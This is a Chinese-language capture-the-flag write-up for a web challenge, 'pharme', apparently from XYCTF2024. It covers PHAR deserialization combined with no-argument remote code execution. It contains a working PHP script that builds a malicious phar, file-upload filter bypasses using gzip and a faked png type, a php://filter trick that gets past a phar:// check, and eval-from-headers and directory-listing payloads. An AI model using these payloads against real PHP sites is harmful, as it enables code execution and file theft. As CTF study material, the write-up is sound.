# pharme

> 分类：Web

## 题目描述
PHAR 反序列化 + 无参 RCE 题。通过文件上传上传 phar 包（需 gzip 绕过 `__HALT_COMPILER` 检测），再通过 `file_get_contents` 触发 phar 反序列化。`evil::__destruct` 中的正则过滤相当于无参 RCE 白名单，最终配合 `__halt_compiler()` 截断执行。

## 考察知识点
- PHAR 反序列化
- 文件上传绕过（gzip 压缩、改后缀、改 content-type）
- `phar://` 开头正则绕过（`php://filter/resource=phar://`）
- 无参 RCE
- `__halt_compiler()` 截断编译

## 解法
1. 生成 phar 包：
```php
<?php
class evil{
    public $cmd="eval(end(getallheaders()));__halt_compiler();";
}
@unlink('poc.phar');
$phar=new Phar('poc.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o=new evil();
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
?>
```
2. gzip 压缩一下绕过文件内容过滤（`__HALT_COMPILER` 被检测），发包时改后缀和 content-type 为 png。
3. `file` 参数用 `php://filter` 绕过 `phar://` 开头正则：
```
file=php://filter/convert.base64-encode/resource=phar:///tmp/23f1a0f70f076b42b5b49f24ee28f696.png
```

无参 RCE 背景：`preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd))` 将字母、下划线、括号移除，连续分号替换为 `ch3nx1` 后与 `ch3nx1` 比较——即白名单只能含 A-Z、a-z、下划线、`()`，是典型的无参 RCE。

常用无参 payload：
```
print_r(scandir(current(localeconv())));   // 查看当前目录
show_source(array_rand(array_flip(scandir(current(localeconv())))));   // 随机读文件
print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));   // 读根目录
```

推荐通过请求头打（更稳定）：`print_r(getallheaders());eval(reset(getallheaders()));__halt_compiler();`，在请求头中带命令。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
